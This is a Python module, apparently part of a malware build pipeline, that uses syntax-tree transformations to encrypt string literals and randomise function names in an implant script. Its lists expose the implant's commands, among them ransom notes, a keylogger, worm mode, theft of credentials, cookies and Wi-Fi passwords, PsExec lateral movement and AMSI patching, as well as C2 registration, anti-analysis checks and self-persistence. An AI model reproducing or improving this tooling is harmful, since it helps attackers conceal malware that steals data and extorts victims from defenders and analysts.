# strategies/obfuscation.py

import ast
import random
import string
from .base import BuildContext, ObfuscationStrategy
from .string_obfuscator import SessionObfuscator

# --- Classes de Transformação AST (do seu polymorphic_engine.py) ---

class StringObfuscatorTransformer(ast.NodeTransformer):
    def __init__(self, session_obfuscator: SessionObfuscator):
        super().__init__()
        self.session_obfuscator = session_obfuscator
        self.obfuscation_enabled = True  # Novo: um interruptor para a ofuscação
        self.strings_to_ignore = {
            "%%C2_SERVER_URL%%", "%%C2_PROFILE%%", "%%DEBUG_MODE%%",
            "utf-8", "w", "r", "a", "rb", "wb", "__main__",
            # --- Nomes de comando do dispatcher ---
            # Chaves dos dicts SYNC_TASKS / THREADED_TASKS / NO_RETURN_TASKS.
            # Manter como strings literais garante que `command in SYNC_TASKS`
            # funcione mesmo se rs() tiver qualquer edge-case em runtime.
            "encrypt", "decrypt_target", "network_scan", "start_attack",
            "run_exploit", "start_worm_mode", "capture_audio",
            "webcam_snap", "ransom_note", "keylogger_start", "keylogger_stop",
            "download", "screenshot", "sysinfo", "cookies", "processes",
            "credentials", "shell", "persist", "start_listener", "kill",
            "elevate", "remote_exec", "spawn", "upload", "wifi_passwords",
            "lateral_psexec", "clipboard", "clipboard_monitor",
            "clipboard_monitor_stop", "session_export", "token_impersonation",
            "revert_token", "amsi_patch", "set_beacon", "cleanup", "sleep",
            "scan_exploit",
        }
        # Quando True, estamos visitando a chave de um dict — não ofuscar.
        self._in_dict_key = False

    def visit_JoinedStr(self, node):
        """
        Este método é chamado ANTES de visitar os filhos de uma f-string.
        """
        # 1. Desliga a ofuscação de strings
        self.obfuscation_enabled = False

        # 2. Continua a visita normalmente (processa os filhos da f-string)
        # Como o interruptor está desligado, o visit_Constant não fará nada.
        self.generic_visit(node)

        # 3. Liga a ofuscação de strings novamente após sair da f-string
        self.obfuscation_enabled = True

        # 4. Retorna o nó f-string original, sem alterações
        return node

    def visit_Dict(self, node):
        """
        Não ofusca CHAVES de dicionário.
        Chaves são identifiers de lookup (ex: "clipboard_monitor" in SYNC_TASKS).
        Se rs() falhar em runtime, o key lookup quebra silenciosamente — evitamos isso
        mantendo chaves como strings literais.  Valores ainda são ofuscados normalmente.
        """
        prev = self._in_dict_key
        new_keys = []
        for key in node.keys:
            self._in_dict_key = True
            new_keys.append(self.visit(key) if key is not None else None)
        self._in_dict_key = prev

        new_values = [self.visit(v) for v in node.values]
        node.keys   = new_keys
        node.values = new_values
        return node

    def visit_Subscript(self, node):
        """
        Não ofusca o índice de subscript quando é usado para ESCREVER num dict.
        Ex: SYNC_TASKS["set_beacon"] = func  →  o "set_beacon" permanece literal.
        Leitura de subscript (ex: d["key"]) não é afetada em lookups de string.
        """
        prev = self._in_dict_key
        # Não ofusca o slice/index — pode ser chave de dict
        self._in_dict_key = True
        new_slice = self.visit(node.slice)
        self._in_dict_key = prev

        node.slice = new_slice
        node.value = self.visit(node.value)  # Ofusca o objeto em si normalmente
        return node

    def visit_Constant(self, node):
        """
        Este método agora verifica o interruptor 'obfuscation_enabled' e o flag '_in_dict_key'.
        """
        # Não ofusca chaves de dict/subscript nem strings dentro de f-strings
        if self.obfuscation_enabled and not self._in_dict_key and isinstance(node.value, str) and node.value not in self.strings_to_ignore and len(node.value) > 2:
            iv_b64, encrypted_data_b64 = self.session_obfuscator.obfuscate(node.value)
            
            call_node = ast.Call(
                func=ast.Name(id='rs', ctx=ast.Load()),
                args=[ast.Constant(value=encrypted_data_b64), ast.Constant(value=iv_b64)],
                keywords=[]
            )
            return ast.copy_location(call_node, node)
            
        # Se o interruptor estiver desligado, ou se a string não for candidata, retorna o nó original.
        return node


class GlobalDefinitionVisitor(ast.NodeVisitor):
    """
    Este novo visitor encontra APENAS funções e classes
    definidas no escopo de nível superior (global) do módulo.
    """
    def __init__(self):
        self.global_definitions = set()

    def visit_FunctionDef(self, node):
        # Adiciona apenas se for uma função de nível superior (sem pai de função/classe)
        # Esta lógica é um placeholder, a forma mais simples é visitar apenas o corpo do módulo.
        self.global_definitions.add(node.name)
        # Não chamamos self.generic_visit() para não entrar em funções aninhadas.

    def visit_ClassDef(self, node):
        # Adiciona apenas se for uma classe de nível superior
        self.global_definitions.add(node.name)
        # Não visitamos os filhos para não pegar métodos como definições globais.

class NameObfuscatorTransformer(ast.NodeTransformer):
    def __init__(self):
        self.name_map = {}
        # A lista de proteção continua importante
        self.protected_names = {
        'rs', '_init_decrypt', '_MASTER_KEY', '_DECRYPT_CACHE',
        'initialize_globals', 'main_loop', 'register_with_c2',
        'send_result', 'get_task', 'write_internal_log',
        'anti_analysis_checks', 'self_install_and_persist',
        'get_authenticated_headers', 'encrypt_data', 'decrypt_data'
    }

    def build_name_map(self, tree):
        """
        Constrói o mapa de renomeação usando o novo GlobalDefinitionVisitor.
        """
        visitor = GlobalDefinitionVisitor()
        # Visita apenas os nós do corpo do módulo de nível superior
        for node in ast.iter_child_nodes(tree):
            if isinstance(node, (ast.FunctionDef, ast.ClassDef)):
                visitor.global_definitions.add(node.name)

        for name in visitor.global_definitions:
            if name not in self.protected_names and not name.startswith('__'):
                self.name_map[name] = '_p_' + ''.join(random.choices(string.ascii_lowercase, k=10))

    def visit_Name(self, node: ast.Name) -> ast.Name:
        """
        Substitui nomes de funções/classes globais.
        """
        if node.id in self.name_map:
            node.id = self.name_map[node.id]
        return node

    def visit_FunctionDef(self, node: ast.FunctionDef) -> ast.FunctionDef:
        """
        Renomeia a DEFINIÇÃO da função.
        """
        if node.name in self.name_map:
            node.name = self.name_map[node.name]
        # IMPORTANTE: Continuamos a visita para que as CHAMADAS dentro desta função sejam renomeadas.
        self.generic_visit(node)
        return node

    def visit_ClassDef(self, node: ast.ClassDef) -> ast.ClassDef:
        """
        Renomeia a DEFINIÇÃO da classe.
        """
        if node.name in self.name_map:
            node.name = self.name_map[node.name]
        self.generic_visit(node)
        return node



# --- Estratégias Concretas ---

class StringObfuscationStrategy(ObfuscationStrategy):
    def execute(self, context: BuildContext) -> BuildContext:
        source_code = context.entry_script_path.read_text(encoding="utf-8")
        tree = ast.parse(source_code)
        
        session_obfuscator = SessionObfuscator()
        transformer = StringObfuscatorTransformer(session_obfuscator)
        obfuscated_tree = transformer.visit(tree)
        
        # --- INÍCIO DA CORREÇÃO FINAL ---

        # 1. Parseia o código de descriptografia
        decrypt_code = session_obfuscator.get_decrypt_function_code()
        decrypt_tree = ast.parse(decrypt_code)

        # 2. Encontra o ponto de inserção: logo após a última importação no script.
        # Isso garante que as funções injetadas venham depois de todas as dependências.
        insert_pos = 0
        for i, node in enumerate(obfuscated_tree.body):
            if isinstance(node, (ast.Import, ast.ImportFrom)):
                insert_pos = i + 1
            # Para de procurar após a primeira linha que não é um import ou docstring
            elif not isinstance(node, (ast.Expr, ast.Constant)):
                break

        # 3. Injeta as DEFINIÇÕES das funções de descriptografia (TODAS ELAS, na ordem inversa)
        for node in reversed(decrypt_tree.body):
            obfuscated_tree.body.insert(insert_pos, node)

        # 4. Cria a CHAMADA de inicialização
        init_call = ast.Expr(value=ast.Call(
            func=ast.Name(id='_init_decrypt', ctx=ast.Load()),
            args=[ast.Constant(value=session_obfuscator.get_master_key_b64())],
            keywords=[]
        ))

        # 5. Insere a CHAMADA logo após as definições que acabamos de injetar.
        obfuscated_tree.body.insert(insert_pos + len(decrypt_tree.body), init_call)

        # --- FIM DA CORREÇÃO FINAL ---

        ast.fix_missing_locations(obfuscated_tree)
        context.entry_script_path.write_text(ast.unparse(obfuscated_tree), encoding="utf-8")
        return context

class IdentifierManglingStrategy(ObfuscationStrategy):
    def execute(self, context: BuildContext) -> BuildContext:
        source_code = context.entry_script_path.read_text(encoding="utf-8")
        tree = ast.parse(source_code)
        
        transformer = NameObfuscatorTransformer()
        transformer.build_name_map(tree)
        obfuscated_tree = transformer.visit(tree)
        
        ast.fix_missing_locations(obfuscated_tree)
        context.entry_script_path.write_text(ast.unparse(obfuscated_tree), encoding="utf-8")
        return context
